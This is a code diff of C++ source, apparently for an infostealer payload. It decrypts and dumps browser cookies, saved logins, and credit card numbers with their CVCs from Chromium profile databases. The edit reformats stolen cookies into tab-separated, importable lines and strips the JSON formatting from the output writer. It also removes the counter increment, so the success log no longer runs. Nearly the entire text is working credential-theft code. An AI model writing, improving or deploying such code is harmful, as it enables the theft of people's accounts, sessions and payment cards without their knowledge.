@@ -310,110 +310,123 @@ namespace Payload
         }
     }
 
-    namespace Data
+namespace Data
+{
+    struct ExtractionConfig
     {
-        struct ExtractionConfig
-        {
-            fs::path dbRelativePath;
-            std::string outputFileName;
-            std::string sqlQuery;
-            std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
-            std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
-        };
+        fs::path dbRelativePath;
+        std::string outputFileName;
+        std::string sqlQuery;
+        std::function<std::optional<std::any>(sqlite3 *)> preQuerySetup;
+        std::function<std::optional<std::string>(sqlite3_stmt *, const std::vector<uint8_t> &, const std::any &)> jsonFormatter;
+    };
 
-        const std::vector<ExtractionConfig> &GetExtractionConfigs()
-        {
-            static const std::vector<ExtractionConfig> configs = {
-                {fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, encrypted_value FROM cookies;",
-                 nullptr,
-                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+    const std::vector<ExtractionConfig> &GetExtractionConfigs()
+    {
+        static const std::vector<ExtractionConfig> configs = {
+            {
+             fs::path("Network") / "Cookies", "cookies", "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value FROM cookies;",
+             nullptr,
+             [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+             {
+                 const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 6));
+                 if (!blob)
+                     return std::nullopt;
+                 try
                  {
-                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
-                     if (!blob)
+                     auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 6)});
+                     constexpr size_t value_offset = 32;
+                     if (plain.size() <= value_offset)
                          return std::nullopt;
-                     try
-                     {
-                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
-                         constexpr size_t value_offset = 32;
-                         if (plain.size() <= value_offset)
-                             return std::nullopt;
-                         std::string val(reinterpret_cast<char *>(plain.data() + value_offset), plain.size() - value_offset);
-                         return "  {\"host\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
-                                "\",\"name\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
-                                "\",\"value\":\"" + Utils::EscapeJson(val) + "\"}";
-                     }
-                     catch (...)
-                     {
-                         return std::nullopt;
-                     }
-                 }},
-                {"Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
-                 nullptr,
-                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+                     std::string val(reinterpret_cast<char *>(plain.data() + value_offset), plain.size() - value_offset);
+                     const char* host_key = (const char*)sqlite3_column_text(stmt, 0);
+                     const char* name = (const char*)sqlite3_column_text(stmt, 1);
+                     const char* path = (const char*)sqlite3_column_text(stmt, 2);
+                     bool is_secure = sqlite3_column_int(stmt, 3) != 0;
+                     bool is_httponly = sqlite3_column_int(stmt, 4) != 0;
+                     const char* expires_utc = (const char*)sqlite3_column_text(stmt, 5);
+                     return Utils::EscapeJson(host_key ? host_key : "") + "\t" +
+                            (is_secure ? "TRUE" : "FALSE") + "\t" +
+                            Utils::EscapeJson(path ? path : "") + "\t" +
+                            (is_httponly ? "TRUE" : "FALSE") + "\t" +
+                            Utils::EscapeJson(expires_utc ? expires_utc : "") + "\t" +
+                            Utils::EscapeJson(name ? name : "") + "\t" +
+                            Utils::EscapeJson(val);
+                 }
+                 catch (...)
                  {
-                     const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
-                     if (!blob)
-                         return std::nullopt;
-                     try
-                     {
-                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
-                         return "  {\"origin\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
-                                "\",\"username\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
-                                "\",\"password\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
-                     }
-                     catch (...)
-                     {
-                         return std::nullopt;
-                     }
-                 }},
-                {"Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
-                 [](sqlite3 *db) -> std::optional<std::any>
+                     return std::nullopt;
+                 }
+             }},
+            {
+             "Login Data", "passwords", "SELECT origin_url, username_value, password_value FROM logins;",
+             nullptr,
+             [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+             {
+                 const uint8_t *blob = reinterpret_cast<const uint8_t *>(sqlite3_column_blob(stmt, 2));
+                 if (!blob)
+                     return std::nullopt;
+                 try
                  {
-                     auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
-                     sqlite3_stmt *stmt = nullptr;
-                     if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
-                         return cvcMap;
-                     while (sqlite3_step(stmt) == SQLITE_ROW)
-                     {
-                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
-                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
-                         if (guid && blob)
-                             (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
-                     }
-                     sqlite3_finalize(stmt);
+                     auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 2)});
+                     return "  {\"origin\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
+                            "\",\"username\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
+                            "\",\"password\":\"" + Utils::EscapeJson({(char *)plain.data(), plain.size()}) + "\"}";
+                 }
+                 catch (...)
+                 {
+                     return std::nullopt;
+                 }
+             }},
+            {
+             "Web Data", "payments", "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;",
+             [](sqlite3 *db) -> std::optional<std::any>
+             {
+                 auto cvcMap = std::make_shared<std::unordered_map<std::string, std::vector<uint8_t>>>();
+                 sqlite3_stmt *stmt = nullptr;
+                 if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc;", -1, &stmt, nullptr) != SQLITE_OK)
                      return cvcMap;
-                 },
-                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+                 while (sqlite3_step(stmt) == SQLITE_ROW)
                  {
-                     const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
-                     std::string card_num_str, cvc_str;
-                     try
+                     const char *guid = (const char *)sqlite3_column_text(stmt, 0);
+                     const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 1);
+                     if (guid && blob)
+                         (*cvcMap)[guid] = {blob, blob + sqlite3_column_bytes(stmt, 1)};
+                 }
+                 sqlite3_finalize(stmt);
+                 return cvcMap;
+             },
+             [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+             {
+                 const auto &cvcMap = std::any_cast<std::shared_ptr<std::unordered_map<std::string, std::vector<uint8_t>>>>(state);
+                 std::string card_num_str, cvc_str;
+                 try
+                 {
+                     const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
+                     if (blob)
                      {
-                         const uint8_t *blob = (const uint8_t *)sqlite3_column_blob(stmt, 4);
-                         if (blob)
-                         {
-                             auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
-                             card_num_str.assign((char *)plain.data(), plain.size());
-                         }
-                         const char *guid = (const char *)sqlite3_column_text(stmt, 0);
-                         if (guid && cvcMap->count(guid))
-                         {
-                             auto plain = Crypto::DecryptGcm(key, cvcMap->at(guid));
-                             cvc_str.assign((char *)plain.data(), plain.size());
-                         }
+                         auto plain = Crypto::DecryptGcm(key, {blob, blob + sqlite3_column_bytes(stmt, 4)});
+                         card_num_str.assign((char *)plain.data(), plain.size());
                      }
-                     catch (...)
+                     const char *guid = (const char *)sqlite3_column_text(stmt, 0);
+                     if (guid && cvcMap->count(guid))
                      {
+                         auto plain = Crypto::DecryptGcm(key, cvcMap->at(guid));
+                         cvc_str.assign((char *)plain.data(), plain.size());
                      }
-                     return "  {\"name_on_card\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
-                            "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
-                            ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
-                            ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
-                            "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
-                 }}};
-            return configs;
-        }
+                 }
+                 catch (...)
+                 {
+                 }
+                 return "  {\"name_on_card\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
+                        "\",\"expiration_month\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
+                        ",\"expiration_year\":" + std::to_string(sqlite3_column_int(stmt, 3)) +
+                        ",\"card_number\":\"" + Utils::EscapeJson(card_num_str) +
+                        "\",\"cvc\":\"" + Utils::EscapeJson(cvc_str) + "\"}";
+             }}};
+        return configs;
     }
+}
 
     class DecryptionSession
     {
@@ -652,7 +665,7 @@ namespace Payload
             if (!out)
                 return;
 
-            out << "[\n";
+            out << "\n";
             bool first = true;
             int count = 0;
             while (sqlite3_step(stmtGuard.get()) == SQLITE_ROW)
@@ -660,13 +673,12 @@ namespace Payload
                 if (auto jsonEntry = dataCfg.jsonFormatter(stmtGuard.get(), aesKey, preQueryState))
                 {
                     if (!first)
-                        out << ",\n";
+                        out << "\n";
                     first = false;
                     out << *jsonEntry;
-                    count++;
                 }
             }
-            out << "\n]\n";
+            out << "\n\n";
             if (count > 0)
                 Log("     [*] " + std::to_string(count) + " " + dataCfg.outputFileName + " extracted to " + outFilePath.u8string());
         }
